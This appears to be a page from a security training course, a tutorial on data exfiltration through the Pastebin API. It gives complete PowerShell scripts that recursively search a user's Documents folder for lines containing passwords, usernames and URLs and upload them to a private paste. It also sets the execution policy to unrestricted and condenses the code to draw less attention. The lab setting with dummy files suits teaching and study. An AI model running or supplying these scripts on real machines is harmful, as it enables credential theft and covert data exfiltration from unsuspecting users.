---
layout: default
title: Data Exfiltration using Pastebin
nav_order: 6
---
# First demo

Go to the folder where you previously created logindata.ps1 and create a new file called `new-pastebin.ps1` with the code below. Open your terminal and run new-pastebin.ps1 (don't doubleclick in windows, run it via the Powershell terminal)

You might have to launch powershell as administrator first to change the set-executionpolicy to "unrestricted"

```powershell
set-executionpolicy unrestricted
```

1. Observe the results. You will see an URL
2. Visit this URL

```powershell
#Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
. .\logindata.ps1
$Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
$Title      =   "pastebin1"

$Body = @{ 
    api_dev_key         = $DevKey;
    #    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "0"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```

You might encounter an error related to the "internet explorer engine", if that's the case: launch internet explorer and click through the initial setup.

![Internet Explorer first setup](/images/IE11.png)

This should fix your issue.

## Preparing a more advanced use of Pastebin
Thus far, our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃.

For this we need to setup our “userkey”​

This means we will use 2 keys​: 
1. Our dev key, which we already have​.
2. Our user key, which still needs creation.

### Userkey creation

Create a new file called `get-apiuserkey.ps1`, using the code below.
```powershell

$DevKey     = "PUT-DEV-KEY-HERE"
$Username   = "PUT-PASTEBIN-USERNAME-HERE"
$Password   = "PUT-PASTEBIN-PASSWORD-HERE"
$PasteBinLogin = "https://pastebin.com/api/api_login.php"
$Body = @{ 
    api_dev_key = $DevKey;
    api_user_name	= $Username;
    api_user_password = $Password;
    }

Invoke-WebRequest -Uri $PasteBinLogin -UseBasicParsing -Body $Body -Method Post -OutFile Api_user_key.txt
```
- Fill in the 3 required variables at the top.
- Run the script from the terminal.
- Your userkey is saved in Api_user_key.txt
- Add this key to logindata.ps1


Once this is done… we’re cooking!

### Create some dummy files
For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` put these 2 files in your documents folder: `C:\Users\$env:username\Documents`

password.txt has the following contents
```powershell

PUT THIS FILE IN C:\Users\$env:username\Documents
I do silly things like sometimes putting passwords in files.

```
secret.txt has the following contents
```
PUT THIS FILE IN C:\Users\$env:username\Documents
this is my secret file
my password for example.com is Kameham3ha!
my username for example.com is ThebrokeShadower
https://www.example.com/login-or-something
```
# Second demo
Create a new file called "new-pastebin2.ps1" and copy paste the following data in it:
```powershell

#Demo 2, let's grab some passwords from local files!
. .\logindata.ps1
$Content    =   ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path
$Title      =   "pastebin2"

$Body = @{ 
    api_dev_key         = $DevKey;
    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
Execute new-pastebin2.ps1 from the terminal. If all goes well, you will have this pastebin under your personal account on the pastebin.com website.
But there seems to be a problem?

# Third demo

Powershell stores the data in an object. Which is not bad but invoke-webrequest doesn’t understand it and thus the parsing is bad.
Let’s convert the data to a format which will work.
Create new-pastebin3.ps1 and observe the difference with new-pastebin2.ps1
```powershell
. .\logindata.ps1
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path)
$Title      =   "pastebin3"

$Body = @{ 
    api_dev_key         = $DevKey;
    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```


Now launch new-pastebin3.ps1 from the terminal.
Observe the results in your pastebin.com account

# Fourth demo
We want to generate a bit less attention so we will try to have less lines of code on our screen.
Luckily, we can do this by using “;” in powershell
Create new-pastebin4.ps1 and new-pastebin5.ps1

new-pastebin4.ps1
```powershell
. .\logindata.ps1
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin4"
$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
new-pastebin5.ps1
```powershell
$DevKey="PUT-DEVKEY-HERE";$UserKey="PUT-USER-KEY-HERE"
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin5"
$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
Observe the concatenation done in those 2 files.
What is the difference between 4 and 5? Why would this be?
